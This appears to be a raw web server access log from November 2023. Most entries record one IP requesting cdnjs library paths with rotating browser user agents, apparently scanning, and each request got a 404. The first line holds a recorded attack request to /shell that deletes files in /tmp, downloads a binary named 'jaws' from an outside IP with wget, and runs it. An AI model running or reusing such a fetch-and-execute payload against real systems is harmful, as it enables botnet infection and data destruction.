197.60.180.235 - - [05/Nov/2023:21:59:27 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+91.92.243.35/jaws;sh+/tmp/jaws HTTP/1.1" 404 12981 "-" "Hello, world"
3.231.155.26 - - [05/Nov/2023:23:10:00 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
3.231.155.26 - - [05/Nov/2023:23:10:00 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13"
3.231.155.26 - - [05/Nov/2023:23:10:00 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1"
3.231.155.26 - - [05/Nov/2023:23:10:01 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
3.231.155.26 - - [05/Nov/2023:23:10:01 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
3.231.155.26 - - [05/Nov/2023:23:10:01 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js HTTP/1.1" 404 4611 "-" "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10"
3.231.155.26 - - [05/Nov/2023:23:10:03 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
3.231.155.26 - - [05/Nov/2023:23:10:33 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js HTTP/1.1" 404 4611 "-" "HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
3.231.155.26 - - [05/Nov/2023:23:10:33 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
3.231.155.26 - - [05/Nov/2023:23:10:33 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27"
3.231.155.26 - - [05/Nov/2023:23:10:33 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 YaBrowser/22.1.0.194 (lite) Mobile Safari/537.36"
3.231.155.26 - - [05/Nov/2023:23:10:33 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0"
3.231.155.26 - - [05/Nov/2023:23:10:33 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js HTTP/1.1" 404 4611 "-" "NetSurf/1.2 (NetBSD; amd64)"
3.231.155.26 - - [05/Nov/2023:23:10:35 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux 3.8-6.dmz.1-liquorix-686) KHTML/4.8.4 (like Gecko) Konqueror/4.8"
3.231.155.26 - - [05/Nov/2023:23:10:36 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5"
3.231.155.26 - - [05/Nov/2023:23:10:37 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36"
3.231.155.26 - - [05/Nov/2023:23:10:37 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15  (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"
